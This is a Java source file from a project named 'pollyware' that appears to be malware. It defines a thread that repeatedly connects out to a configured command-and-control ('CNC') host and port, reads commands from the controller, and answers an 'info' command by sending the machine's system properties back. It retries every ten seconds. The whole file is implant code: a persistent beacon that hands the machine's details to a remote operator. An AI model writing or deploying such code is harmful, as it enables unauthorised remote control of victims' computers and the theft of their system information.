package me.aaronakhtar.pollyware;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Arrays;

public class Threads {

    public static Thread listen(){
        Thread thread = new Thread(){
            @Override
            public void run() {
                try {
                    while(true){
                        try {
                            String host = Pollyware.getConfigParam("CNC").toString();
                            int port = Integer.parseInt(Pollyware.getConfigParam("CNC-PORT").toString());
                            Socket socket = new Socket(host, port);
                            if (socket.getInetAddress().getHostAddress().equalsIgnoreCase(Pollyware.getConfigParam("CNC").toString())) { // only cnc connections allowed
                                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                                PrintWriter writer = new PrintWriter(socket.getOutputStream());
                                String line;
                                while (Utils.isConn(socket.getOutputStream())) {
                                    try {
                                        while ((line = reader.readLine()) != null) {
                                            String[] args = line.toLowerCase().split(" ");
                                            System.out.println(Arrays.toString(args[0].getBytes()));
                                            if (args[0].equalsIgnoreCase("info")) { // returns system info from system properties
                                               
                                                String[] l = new String[args.length - 1];
                                                for (int x = 1; x < args.length; x++) {
                                                    l[x - 1] = args[x];
                                                }
                                                
                                                writer.println(Utils.returnProps(l).toString());
                                                
                                                writer.flush();
                                            }
                                        }
                                    }catch (NullPointerException e){
                                        e.printStackTrace();
                                    }
                                }
                                reader.close();
                                writer.close();
                            }
                            socket.close();
                            Thread.sleep(10000);
                        }catch (Exception e){
                            e.printStackTrace();
                        }
                    }
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        };
        return thread;
    }

}
